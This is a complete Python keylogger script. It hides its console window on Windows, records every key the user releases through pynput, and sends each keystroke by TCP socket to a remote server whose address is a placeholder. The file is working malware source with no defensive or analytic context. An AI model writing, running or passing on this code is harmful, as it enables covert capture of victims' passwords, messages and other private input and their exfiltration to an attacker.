import pynput 
import socket
import ctypes
from pynput.keyboard import Key, Listener

SERVER = "X.X.X.X" # Set your server address
SERVER_PORT = 9001 # Set your server port

def processKey(key):
    
    if key == pynput.keyboard.Key.space: 
        data = " "
    elif key == pynput.keyboard.Key.enter:
        data = "\n"
    else:
        data = str(key).strip("'")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((SERVER, SERVER_PORT))
            client.sendall(data.encode("utf-8"))
    except Exception as e:
        print(f"Error sending data: {e}")

def keylogger():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    with Listener(on_release=processKey) as listener:
        listener.join()

keylogger()